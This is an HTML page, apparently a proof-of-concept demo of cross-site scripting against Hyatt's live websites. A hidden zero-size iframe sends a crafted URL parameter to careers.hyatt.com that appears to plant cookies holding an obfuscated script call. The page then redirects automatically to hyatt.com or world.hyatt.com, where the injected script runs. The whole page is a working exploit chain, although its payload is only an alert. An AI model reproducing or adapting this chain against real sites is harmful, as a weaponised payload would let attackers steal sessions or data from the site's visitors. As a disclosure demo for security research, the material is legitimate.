<!DOCTYPE html>
<html>
	<head>
		<title>Hyatt XSS Demo</title>
	</head>
	<body>
    Loading...
		<button id="openhyatt" disabled>XSS on Hyatt.com</button>
		<br />
		<button id="openworldhyatt" disabled>XSS on world.hyatt.com</button>
		<script type="text/javascript">
			function handleOnload() {
				setTimeout( () => {
					document.getElementById( 'openhyatt' ).removeAttribute( 'disabled', false );
					document.getElementById( 'openworldhyatt' ).removeAttribute( 'disabled', false );

					setTimeout( openHyatt, 4000 );
				}, 3000 );
			      }

			function openHyatt() {
				window.location.href = `https://hyatt.com?src=${ getRandomInt( 10000 ) }`;
			}

			function openWorldHyatt() {
				window.location.href = `https://world.hyatt.com/content/gp/en/offers.html?src=${ getRandomInt( 10000 ) }`;
			}
			
			function getRandomInt(max) {
  				return Math.floor(Math.random() * max);
			}
			
			document.getElementById( 'openhyatt' ).addEventListener( 'click', openHyatt );
			document.getElementById( 'openworldhyatt' ).addEventListener( 'click', openWorldHyatt );
		</script>
    
    
    <iframe src="https://careers.hyatt.com/en-US/careers/?src=%20s_cmkw%3D%5B%5B1%5D%5D%20s_cmch%3Dwindow%5B%22al%22%252B%22ert%22%5D(1)%3BSameSite%3DNone%3BSecure" onload="handleOnload()" style="width:0;height:0;border:0;"></iframe>
	</body>
</html>
